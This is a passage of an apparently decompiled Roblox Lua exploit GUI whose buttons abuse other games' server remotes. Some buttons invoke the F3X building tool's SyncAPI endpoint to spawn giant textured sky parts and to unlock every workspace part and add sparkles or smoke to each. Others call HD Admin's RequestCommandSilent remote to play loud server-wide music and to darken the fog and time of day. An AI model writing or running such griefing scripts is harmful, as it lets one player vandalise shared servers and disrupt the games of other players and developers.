					ResetSky()
				end)
	
				if char and char:FindFirstChild("Humanoid") then
					char:WaitForChild("Humanoid").Died:Connect(function()
						ResetSky()
					end)
				end
	
				CreateSky()
			end)
		end
		coroutine.wrap(SMIX_fake_script)()
		local function AICIUKW_fake_script() -- b_33.LocalScript 
			local script = Instance.new('LocalScript', b_33)
	
			script.Parent.MouseButton1Click:Connect(function()
				local player = game.Players.LocalPlayer
				local char = player.Character or player.CharacterAdded:Wait()
				local tool
	
				for i, v in player:GetDescendants() do
					if v.Name == "SyncAPI" then
						tool = v.Parent
					end
				end
	
				for i, v in game.ReplicatedStorage:GetDescendants() do
					if v.Name == "SyncAPI" then
						tool = v.Parent
					end
				end
	
				local remote = tool.SyncAPI.ServerEndpoint
				local RunService = game:GetService("RunService")
	
				function _(args)
					remote:InvokeServer(unpack(args))
				end
	
				function CreatePart(cf, parent)
					local args = {
						[1] = "CreatePart",
						[2] = "Normal",
						[3] = cf,
						[4] = parent
					}
					_(args)
				end
	
				function SetAnchor(part, boolean)
					local args = {
						[1] = "SyncAnchor",
						[2] = {
							[1] = {
								["Part"] = part,
								["Anchored"] = boolean
							}
						}
					}
					_(args)
				end
	
				function AddMesh(part)
					local args = {
						[1] = "CreateMeshes",
						[2] = {
							[1] = {
								["Part"] = part
							}
						}
					}
					_(args)
				end
	
				function SetMesh(part, meshid)
					local args = {
						[1] = "SyncMesh",
						[2] = {
							[1] = {
								["Part"] = part,
								["MeshId"] = "rbxassetid://" .. meshid
							}
						}
					}
					_(args)
				end
	
				function SetTexture(part, texid)
					local args = {
						[1] = "SyncMesh",
						[2] = {
							[1] = {
								["Part"] = part,
								["TextureId"] = texid
							}
						}
					}
					_(args)
				end
	
				function MeshResize(part, size)
					local args = {
						[1] = "SyncMesh",
						[2] = {
							[1] = {
								["Part"] = part,
								["Scale"] = size
							}
						}
					}
					_(args)
				end
	
				function SetTransparency(part, value)
					local args = {
						[1] = "SyncTransparency",
						[2] = {
							[1] = {
								["Part"] = part,
								["Transparency"] = value
							}
						}
					}
					_(args)
				end
	
	
				function SetName(part, stringg)
					local args = {
						[1] = "SetName",
						[2] = {
							[1] = part
						},
						[3] = stringg
					}
	
					_(args)
				end
	
				function DestroyPart(part)
					local args = {
						[1] = "Remove",
						[2] = {
							[1] = part
						}
					}
					_(args)
				end
	
				local images = {
					"rbxassetid://102681428361624",
					"rbxassetid://82853434525579"
				}
	
				local skyPart
				local skyLoop
				local frameTime = 2 / 20
				local lastUpdate = 0
	
				function CreateSky()
					local hrp = char:FindFirstChild("HumanoidRootPart")
					if not hrp then return end
	
					local cf = hrp.CFrame
					CreatePart(CFrame.new(cf.Position + Vector3.new(0, 6, 0)), workspace)
	
					for _, v in workspace:GetDescendants() do
						if v:IsA("BasePart") and v.CFrame.Position == cf.Position + Vector3.new(0, 6, 0) then
							skyPart = v
							SetAnchor(skyPart, true)
							AddMesh(skyPart)
							SetMesh(skyPart, "111891702759441")
							MeshResize(skyPart, Vector3.new(5000, 5000, 5000))
							SetTransparency(skyPart, 1)
							SetName(v,"Sky")
	
							function SyncLighting(part,brightness)
								_({
									[1] = "SyncLighting",
									[2] = {
										[1] = {
											["Part"] = part,
											["LightType"] = "SpotLight",
											["Brightness"] = brightness
										}
									}
								})
							end
	
							local index = 1
							skyLoop = RunService.Heartbeat:Connect(function(deltaTime)
								lastUpdate = lastUpdate + deltaTime
								if lastUpdate >= frameTime then
									lastUpdate = 0
									if not skyPart then
										print("fuck ittt")
										return
									end
									SetTransparency(skyPart, 0)
									SetTexture(skyPart, images[index])
									index = index % #images + 1
								end
							end)
						end
					end
				end
	
				function ResetSky()
					if skyPart then
						DestroyPart(skyPart)
						skyPart = nil
					end
					if skyLoop then
						skyLoop:Disconnect()
						skyLoop = nil
					end
					CreateSky()
				end
	
				player.CharacterAdded:Connect(function(newChar)
					char = newChar
					ResetSky()
				end)
	
				if char and char:FindFirstChild("Humanoid") then
					char:WaitForChild("Humanoid").Died:Connect(function()
						ResetSky()
					end)
				end
	
				CreateSky()
			end)
		end
		coroutine.wrap(AICIUKW_fake_script)()
		local function JFVF_fake_script() -- jeje_3.LocalScript 
			local script = Instance.new('LocalScript', jeje_3)
	
			while wait() do
				for i = 0,255,5 do
					script.Parent.ImageColor3 = Color3.fromRGB(255,i,0) -- change backgroundcolor3 to textcolor3 to make text color rainbow
					wait(0.01)
				end
				for i = 255,0,-5 do
					script.Parent.ImageColor3 = Color3.fromRGB(i,255,0)
					wait(0.01)
				end
				for i = 0,255,5 do
					script.Parent.ImageColor3 = Color3.fromRGB(0,255,i)
					wait(0.01)
				end
				for i = 255,0,-5 do
					script.Parent.ImageColor3 = Color3.fromRGB(0,i,255)
					wait(0.01)
				end
				for i = 0,255,5 do
					script.Parent.ImageColor3 = Color3.fromRGB(i,0,255)
					wait(0.01)
				end
				for i = 255,0,-5 do
					script.Parent.ImageColor3 = Color3.fromRGB(255,0,i)
					wait(0.01)
				end
			end
		end
		coroutine.wrap(JFVF_fake_script)()
		local function IUCK_fake_script() -- b_34.LocalScript 
			local script = Instance.new('LocalScript', b_34)
	
			local button = script.Parent
	
			button.MouseButton1Click:Connect(function()
	
				local player = game.Players.LocalPlayer
				local char = player.Character
				local tool
				for i,v in player:GetDescendants() do
					if v.Name == "SyncAPI" then
						tool = v.Parent
					end
				end
				for i,v in game.ReplicatedStorage:GetDescendants() do
					if v.Name == "SyncAPI" then
						tool = v.Parent
					end
				end
				--craaa
				remote = tool.SyncAPI.ServerEndpoint
				function _(args)
					remote:InvokeServer(unpack(args))
				end
				function SetCollision(part,boolean)
					local args = {
						[1] = "SyncCollision",
						[2] = {
							[1] = {
								["Part"] = part,
								["CanCollide"] = boolean
							}
						}
					}
					_(args)
				end
				function SetAnchor(boolean,part)
					local args = {
						[1] = "SyncAnchor",
						[2] = {
							[1] = {
								["Part"] = part,
								["Anchored"] = boolean
							}
						}
					}
					_(args)
				end
				function CreatePart(cf,parent)
					local args = {
						[1] = "CreatePart",
						[2] = "Normal",
						[3] = cf,
						[4] = parent
					}
					_(args)
				end
				function DestroyPart(part)
					local args = {
						[1] = "Remove",
						[2] = {
							[1] = part
						}
					}
					_(args)
				end
				function MovePart(part,cf)
					local args = {
						[1] = "SyncMove",
						[2] = {
							[1] = {
								["Part"] = part,
								["CFrame"] = cf
							}
						}
					}
					_(args)
				end
				function Resize(part,size,cf)
					local args = {
						[1] = "SyncResize",
						[2] = {
							[1] = {
								["Part"] = part,
								["CFrame"] = cf,
								["Size"] = size
							}
						}
					}
					_(args)
				end
				function AddMesh(part)
					local args = {
						[1] = "CreateMeshes",
						[2] = {
							[1] = {
								["Part"] = part
							}
						}
					}
					_(args)
				end
	
				function SetMesh(part,meshid)
					local args = {
						[1] = "SyncMesh",
						[2] = {
							[1] = {
								["Part"] = part,
								["MeshId"] = "rbxassetid://"..meshid
							}
						}
					}
					_(args)
				end
				function SetTexture(part, texid)
					local args = {
						[1] = "SyncMesh",
						[2] = {
							[1] = {
								["Part"] = part,
								["TextureId"] = "rbxassetid://"..texid
							}
						}
					}
					_(args)
				end
				function SetName(part, stringg)
					local args = {
						[1] = "SetName",
						[2] = {
							[1] = workspace.Part
						},
						[3] = stringg
					}
	
					_(args)
				end
				function MeshResize(part,size)
					local args = {
						[1] = "SyncMesh",
						[2] = {
							[1] = {
								["Part"] = part,
								["Scale"] = size
							}
						}
					}
					_(args)
				end
				function Weld(part1, part2,lead)
					local args = {
						[1] = "CreateWelds",
						[2] = {
							[1] = part1,
							[2] = part2
						},
						[3] = lead
					}
					_(args)
	
				end
				function SetLocked(part,boolean)
					local args = {
						[1] = "SetLocked",
						[2] = {
							[1] = part
						},
						[3] = boolean
					}
					_(args)
				end
				function SetTrans(part,int)
					local args = {
						[1] = "SyncMaterial",
						[2] = {
							[1] = {
								["Part"] = part,
								["Transparency"] = int
							}
						}
					}
					_(args)
				end
				function CreateSpotlight(part)
					local args = {
						[1] = "CreateLights",
						[2] = {
							[1] = {
								["Part"] = part,
								["LightType"] = "SpotLight"
							}
						}
					}
					_(args)
				end
				function SyncLighting(part,brightness)
					local args = {
						[1] = "SyncLighting",
						[2] = {
							[1] = {
								["Part"] = part,
								["LightType"] = "SpotLight",
								["Brightness"] = brightness
							}
						}
					}
					_(args)
				end
				function AddSparkles(part)
					local args = {
						[1] = "CreateDecorations",
						[2] = {
							[1] = {
								["Part"] = part,
								["DecorationType"] = "Sparkles"
							}
						}
					}
					_(args)
				end
				function Sparkles()
					for i,v in game.Workspace:GetDescendants() do
						spawn(function()
							SetLocked(v,false)
							AddSparkles(v)
						end)
					end
				end
				Sparkles()
	
				local player = game.Players.LocalPlayer
	
			end)
	
			--97518021379547
		end
		coroutine.wrap(IUCK_fake_script)()
		local function DGIOM_fake_script() -- b_35.LocalScript 
			local script = Instance.new('LocalScript', b_35)
	
			local button = script.Parent
	
			button.MouseButton1Click:Connect(function()
	
				local player = game.Players.LocalPlayer
				local char = player.Character
				local tool
				for i,v in player:GetDescendants() do
					if v.Name == "SyncAPI" then
						tool = v.Parent
					end
				end
				for i,v in game.ReplicatedStorage:GetDescendants() do
					if v.Name == "SyncAPI" then
						tool = v.Parent
					end
				end
				--craaa
				remote = tool.SyncAPI.ServerEndpoint
				function _(args)
					remote:InvokeServer(unpack(args))
				end
				function SetCollision(part,boolean)
					local args = {
						[1] = "SyncCollision",
						[2] = {
							[1] = {
								["Part"] = part,
								["CanCollide"] = boolean
							}
						}
					}
					_(args)
				end
				function SetAnchor(boolean,part)
					local args = {
						[1] = "SyncAnchor",
						[2] = {
							[1] = {
								["Part"] = part,
								["Anchored"] = boolean
							}
						}
					}
					_(args)
				end
				function CreatePart(cf,parent)
					local args = {
						[1] = "CreatePart",
						[2] = "Normal",
						[3] = cf,
						[4] = parent
					}
					_(args)
				end
				function DestroyPart(part)
					local args = {
						[1] = "Remove",
						[2] = {
							[1] = part
						}
					}
					_(args)
				end
				function MovePart(part,cf)
					local args = {
						[1] = "SyncMove",
						[2] = {
							[1] = {
								["Part"] = part,
								["CFrame"] = cf
							}
						}
					}
					_(args)
				end
				function Resize(part,size,cf)
					local args = {
						[1] = "SyncResize",
						[2] = {
							[1] = {
								["Part"] = part,
								["CFrame"] = cf,
								["Size"] = size
							}
						}
					}
					_(args)
				end
				function AddMesh(part)
					local args = {
						[1] = "CreateMeshes",
						[2] = {
							[1] = {
								["Part"] = part
							}
						}
					}
					_(args)
				end
	
				function SetMesh(part,meshid)
					local args = {
						[1] = "SyncMesh",
						[2] = {
							[1] = {
								["Part"] = part,
								["MeshId"] = "rbxassetid://"..meshid
							}
						}
					}
					_(args)
				end
				function SetTexture(part, texid)
					local args = {
						[1] = "SyncMesh",
						[2] = {
							[1] = {
								["Part"] = part,
								["TextureId"] = "rbxassetid://"..texid
							}
						}
					}
					_(args)
				end
				function SetName(part, stringg)
					local args = {
						[1] = "SetName",
						[2] = {
							[1] = workspace.Part
						},
						[3] = stringg
					}
	
					_(args)
				end
				function MeshResize(part,size)
					local args = {
						[1] = "SyncMesh",
						[2] = {
							[1] = {
								["Part"] = part,
								["Scale"] = size
							}
						}
					}
					_(args)
				end
				function Weld(part1, part2,lead)
					local args = {
						[1] = "CreateWelds",
						[2] = {
							[1] = part1,
							[2] = part2
						},
						[3] = lead
					}
					_(args)
	
				end
				function SetLocked(part,boolean)
					local args = {
						[1] = "SetLocked",
						[2] = {
							[1] = part
						},
						[3] = boolean
					}
					_(args)
				end
				function SetTrans(part,int)
					local args = {
						[1] = "SyncMaterial",
						[2] = {
							[1] = {
								["Part"] = part,
								["Transparency"] = int
							}
						}
					}
					_(args)
				end
				function CreateSpotlight(part)
					local args = {
						[1] = "CreateLights",
						[2] = {
							[1] = {
								["Part"] = part,
								["LightType"] = "SpotLight"
							}
						}
					}
					_(args)
				end
				function SyncLighting(part,brightness)
					local args = {
						[1] = "SyncLighting",
						[2] = {
							[1] = {
								["Part"] = part,
								["LightType"] = "SpotLight",
								["Brightness"] = brightness
							}
						}
					}
					_(args)
				end
				function Smokes(part)
					local args = {
						[1] = "CreateDecorations",
						[2] = {
							[1] = {
								["Part"] = part,
								["DecorationType"] = "Smoke"
							}
						}
					}
					_(args)
				end
				function Smoke()
					for i,v in game.Workspace:GetDescendants() do
						spawn(function()
							SetLocked(v,false)
							Smokes(v)
						end)
					end
				end
				Smoke()
	
				local player = game.Players.LocalPlayer
	
			end)
	
			--97518021379547
		end
		coroutine.wrap(DGIOM_fake_script)()
		local function PQNDWI_fake_script() -- b_36.LocalScript 
			local script = Instance.new('LocalScript', b_36)
	
			local button = script.Parent
	
			button.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommand:InvokeServer(";music 107057266766632 ;pitch 0.1 ;volume 10")
			end)
		end
		coroutine.wrap(PQNDWI_fake_script)()
		local function PHMF_fake_script() -- b_37.LocalScript 
			local script = Instance.new('LocalScript', b_37)
	
			local button = script.Parent
	
			button.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local Players = game:GetService("Players")
	
				local RequestCommand = ReplicatedStorage
					:WaitForChild("HDAdminHDClient")
					.Signals.RequestCommandSilent
	
	
				RequestCommand:InvokeServer(";unfog")
				RequestCommand:InvokeServer(";fogcolor black")
				RequestCommand:InvokeServer(";time 0")
	
				wait(0.3)
	
				local player = Players.LocalPlayer
				local char = player.Character or player.CharacterAdded:Wait()
	
	
				local tool
				for _,v in player:GetDescendants() do
					if v.Name == "SyncAPI" then
						tool = v.Parent
					end
				end
				for _,v in ReplicatedStorage:GetDescendants() do
					if v.Name == "SyncAPI" then
						tool = v.Parent
					end
				end
	
				if not tool then
					warn("No se encontró SyncAPI")
					return
				end
	
				local remote = tool.SyncAPI.ServerEndpoint
				local function _(args)
					remote:InvokeServer(unpack(args))
				end
	
				-- FUNCIONES F3X
				function CreatePart(cf,parent)
					_({
						[1] = "CreatePart",
						[2] = "Normal",
						[3] = cf,
						[4] = parent
					})
				end
	
				function AddMesh(part)
					_({
						[1] = "CreateMeshes",
						[2] = {
							[1] = {["Part"] = part}
						}
					})
				end
	
				function SetMesh(part,id)
					_({
						[1] = "SyncMesh",
						[2] = {
							[1] = {
								["Part"] = part,
								["MeshId"] = "rbxassetid://"..id
							}
						}
					})
				end
	
				function SetTexture(part,id)
					_({
						[1] = "SyncMesh",
						[2] = {
							[1] = {
								["Part"] = part,
								["TextureId"] = "rbxassetid://"..id
							}
						}
					})
				end
	
				function MeshResize(part,size)
					_({
						[1] = "SyncMesh",
						[2] = {
							[1] = {
								["Part"] = part,
								["Scale"] = size
							}
						}
					})
				end
	
				function SetCollision(part,bool)
					_({
						[1] = "SyncCollision",
						[2] = {
							[1] = {
								["Part"] = part,
								["CanCollide"] = bool
							}
						}
					})
				end
	
				function SetLocked(part,bool)
					_({
						[1] = "SetLocked",
						[2] = {[1] = part},
						[3] = bool
					})
				end
	
				function SetName(part,name)
					_({
						[1] = "SetName",
						[2] = {[1] = part},
						[3] = name
					})
				end
	
				function SetVertexColor(part,vec)
					_({
						[1] = "SyncMesh",
						[2] = {
							[1] = {
								["Part"] = part,
								["VertexColor"] = vec
							}
						}
					})
				end
	
				function CreateSpotlight(part)
					_({
						[1] = "CreateLights",
						[2] = {
							[1] = {
								["Part"] = part,
								["LightType"] = "SpotLight"
							}
						}
					})
				end
	
				function SyncLighting(part,brightness)
					_({
						[1] = "SyncLighting",
						[2] = {
							[1] = {
								["Part"] = part,
								["LightType"] = "SpotLight",
								["Brightness"] = brightness
							}
						}
					})
				end
	
	
				function Sky(textureId)
					local hrp = char:WaitForChild("HumanoidRootPart")
	
					local x = math.floor(hrp.Position.X)
					local y = math.floor(hrp.Position.Y)
					local z = math.floor(hrp.Position.Z)
	
					CreatePart(
						CFrame.new(x,y,z) + Vector3.new(0,-10,0),
						workspace
					)
	
					for _,v in workspace:GetDescendants() do
						if v:IsA("BasePart")
							and math.floor(v.Position.X) == x
							and math.floor(v.Position.Z) == z then
	
							SetName(v,"sky")
							AddMesh(v)
							SetMesh(v,"111891702759441")
							SetTexture(v, textureId)
	
							MeshResize(v, Vector3.new(99999,99999,99999))
							SetCollision(v,false)
							SetLocked(v,true)
	
	
							SetVertexColor(v, Vector3.new(5,5,5))
	
	
							CreateSpotlight(v)
							SyncLighting(v,12)
						end
					end
				end
	
	
				Sky("118001970292194")
			end)
	
			--97518021379547
		end
		coroutine.wrap(PHMF_fake_script)()
		local function ACLYDOP_fake_script() -- e_2.LocalScript 
			local script = Instance.new('LocalScript', e_2)
	
			local button = script.Parent
	
			button.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommand:InvokeServer(";music 137739199475329 ;pitch 0.12 ;volume 1000")
			end)
		end
		coroutine.wrap(ACLYDOP_fake_script)()
		local function TWEC_fake_script() -- e_3.LocalScript 
			local script = Instance.new('LocalScript', e_3)
	
			local button = script.Parent
	
			button.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommand:InvokeServer(";music 81974406505102 ;pitch 0.12 ;volume 1000")
			end)
		end
		coroutine.wrap(TWEC_fake_script)()
		local function TKATH_fake_script() -- e_4.LocalScript 
			local script = Instance.new('LocalScript', e_4)
	
			local button = script.Parent
	
			button.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommand:InvokeServer(";music 92584083287479 ;pitch 0.21 ;volume 1000")
			end)
		end
		coroutine.wrap(TKATH_fake_script)()
		local function UXZAX_fake_script() -- e_5.LocalScript 
			local script = Instance.new('LocalScript', e_5)
	
			local button = script.Parent
	
			button.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommand:InvokeServer(";music 128622842743995 ;pitch 0.12 ;volume 1000")
			end)
		end
		coroutine.wrap(UXZAX_fake_script)()
		local function DEWQZG_fake_script() -- e_6.LocalScript 
			local script = Instance.new('LocalScript', e_6)
	
			local button = script.Parent
	
			button.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommand:InvokeServer(";music 73835470482241 ;pitch 0.3 ;volume 1000")
			end)
		end
		coroutine.wrap(DEWQZG_fake_script)()
		local function CGGYIY_fake_script() -- e_7.LocalScript 
			local script = Instance.new('LocalScript', e_7)
	
			local button = script.Parent
	
			button.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommand:InvokeServer(";music 70463237028195 ;pitch 0.24 ;volume 1000")
			end)
		end
		coroutine.wrap(CGGYIY_fake_script)()
		local function NPESDBE_fake_script() -- e_8.LocalScript 
			local script = Instance.new('LocalScript', e_8)
	
			local button = script.Parent
	
			button.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommand:InvokeServer(";music 76750962223675 ;pitch 0.12 ;volume 1000")
			end)
		end
		coroutine.wrap(NPESDBE_fake_script)()
		local function IXFOHYN_fake_script() -- e_9.LocalScript 
			local script = Instance.new('LocalScript', e_9)
	
			local button = script.Parent
	
			button.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommand:InvokeServer(";music 102295928741521 ;pitch 0.13 ;volume 1000")
			end)
		end
		coroutine.wrap(IXFOHYN_fake_script)()
		local function FEANHVP_fake_script() -- e_10.LocalScript 
			local script = Instance.new('LocalScript', e_10)
	
			local buttona = script.Parent
	
			buttona.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommand:InvokeServer(";music 106319482692675 ;pitch 0.1 ;volume 1000")
			end)
		end
		coroutine.wrap(FEANHVP_fake_script)()
		local function FQBTADV_fake_script() -- e_11.LocalScript 
			local script = Instance.new('LocalScript', e_11)
	
			local button = script.Parent
	
			button.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommand:InvokeServer(";music 123688374641839 ;pitch 0.16 ;volume 1000")
			end)
		end
		coroutine.wrap(FQBTADV_fake_script)()
		local function ILKRHTA_fake_script() -- e_12.LocalScript 
			local script = Instance.new('LocalScript', e_12)
	
			local button = script.Parent
	
			button.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommand:InvokeServer(";music 109904177360493 ;pitch 0.24 ;volume 1000")
			end)
		end
		coroutine.wrap(ILKRHTA_fake_script)()
		local function KVRRZER_fake_script() -- e_13.LocalScript 
			local script = Instance.new('LocalScript', e_13)
	
			local button = script.Parent
	
			button.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommand:InvokeServer(";music 129245295981728 ;pitch 0.115 ;volume 1000")
			end)
		end
		coroutine.wrap(KVRRZER_fake_script)()
		local function AVWJFAB_fake_script() -- e_14.LocalScript 
			local script = Instance.new('LocalScript', e_14)
	
			local button = script.Parent
	
			button.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommand:InvokeServer(";music 72420924397376 ;pitch 0.2 ;volume 1000")
			end)
		end
		coroutine.wrap(AVWJFAB_fake_script)()
		local function LHBJP_fake_script() -- e_15.LocalScript 
			local script = Instance.new('LocalScript', e_15)
	
			local button = script.Parent
	
			button.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommand:InvokeServer(";music 128327365740560 ;pitch 0.12 ;volume 1000")
			end)
		end
		coroutine.wrap(LHBJP_fake_script)()
		local function STCTP_fake_script() -- e_16.LocalScript 
			local script = Instance.new('LocalScript', e_16)
	
			local button = script.Parent
	
			button.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommand:InvokeServer(";music 106687731139619 ;pitch 0.12 ;volume 1000")
			end)
		end
		coroutine.wrap(STCTP_fake_script)()
		local function VUNVYS_fake_script() -- e_17.LocalScript 
			local script = Instance.new('LocalScript', e_17)
	
			local button = script.Parent
	
			button.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommand:InvokeServer(";music 94797081270081 ;pitch 0.2 ;volume 1000")
			end)
		end
		coroutine.wrap(VUNVYS_fake_script)()
		local function KIPR_fake_script() -- e_18.LocalScript 
			local script = Instance.new('LocalScript', e_18)
	
			local button = script.Parent
	
			button.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommand:InvokeServer(";music 72266196363368 ;pitch 0.27 ;volume 1000")
			end)
		end
		coroutine.wrap(KIPR_fake_script)()
		local function XLNZWH_fake_script() -- e_19.LocalScript 
			local script = Instance.new('LocalScript', e_19)
	
			local button = script.Parent
	
			button.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommand:InvokeServer(";music 99993460719133 ;pitch 0.2 ;volume 1000")
			end)
		end
		coroutine.wrap(XLNZWH_fake_script)()
		local function QOIEAD_fake_script() -- e_20.LocalScript 
			local script = Instance.new('LocalScript', e_20)
	
			local button = script.Parent
	
			button.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommand:InvokeServer(";music 113238741822041 ;pitch 0.17 ;volume 1000")
			end)
		end
		coroutine.wrap(QOIEAD_fake_script)()
		local function QRKVLTH_fake_script() -- e_21.LocalScript 
			local script = Instance.new('LocalScript', e_21)
	
			local button = script.Parent
	
			button.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommand:InvokeServer(";music 101381195264372 ;pitch 0.17 ;volume 1000")
			end)
		end
		coroutine.wrap(QRKVLTH_fake_script)()
		local function IWPQL_fake_script() -- e_22.LocalScript 
			local script = Instance.new('LocalScript', e_22)
	
			local button = script.Parent
	
			button.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommand:InvokeServer(";music 99974358068663 ;pitch 0.15 ;volume 1000")
			end)
		end
		coroutine.wrap(IWPQL_fake_script)()
		local function BCZTMF_fake_script() -- e_23.LocalScript 
			local script = Instance.new('LocalScript', e_23)
	
			local button = script.Parent
	
			button.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommand:InvokeServer(";music 93650961728068 ;pitch 0.15 ;volume 1000")
			end)
		end
		coroutine.wrap(BCZTMF_fake_script)()
		local function YGJWF_fake_script() -- e_24.LocalScript 
			local script = Instance.new('LocalScript', e_24)
	
			local button = script.Parent
	
			button.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommand:InvokeServer(";music 80515722989681 ;pitch 0.22 ;volume 1000")
			end)
		end
		coroutine.wrap(YGJWF_fake_script)()
		local function XKIGONC_fake_script() -- e_25.LocalScript 
			local script = Instance.new('LocalScript', e_25)
	
			local button = script.Parent
	
			button.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommand:InvokeServer(";music 92512466676196 ;pitch 0.11 ;volume 1000")
			end)
		end
		coroutine.wrap(XKIGONC_fake_script)()
		local function QXOEJFO_fake_script() -- e_26.LocalScript 
			local script = Instance.new('LocalScript', e_26)
	
			local button = script.Parent
	
			button.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommand:InvokeServer(";music 100754234156181  ;volume 1000")
			end)
		end
		coroutine.wrap(QXOEJFO_fake_script)()
		local function PXUTXTS_fake_script() -- e_27.LocalScript 
			local script = Instance.new('LocalScript', e_27)
	
			local button = script.Parent
	
			button.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommand:InvokeServer(";music 90947241993019 ;pitch 0.11 ;volume 1000")
			end)
		end
		coroutine.wrap(PXUTXTS_fake_script)()
		local function GYTEUFY_fake_script() -- e_28.LocalScript 
			local script = Instance.new('LocalScript', e_28)
	
			local button = script.Parent
	
			button.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommand:InvokeServer(";music 102278152256379 ;pitch 1.1 ;volume 1000")
			end)
		end
		coroutine.wrap(GYTEUFY_fake_script)()
		local function KGJVZ_fake_script() -- e_29.LocalScript 
			local script = Instance.new('LocalScript', e_29)
	
			local button = script.Parent
	
			button.MouseButton1Click:Connect(function()
				local ReplicatedStorage = game:GetService("ReplicatedStorage")
				local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
				RequestCommand:InvokeServer(";music 140240856766854 ;pitch 0.2 ;volume 1000")
			end)
		end
		coroutine.wrap(KGJVZ_fake_script)()
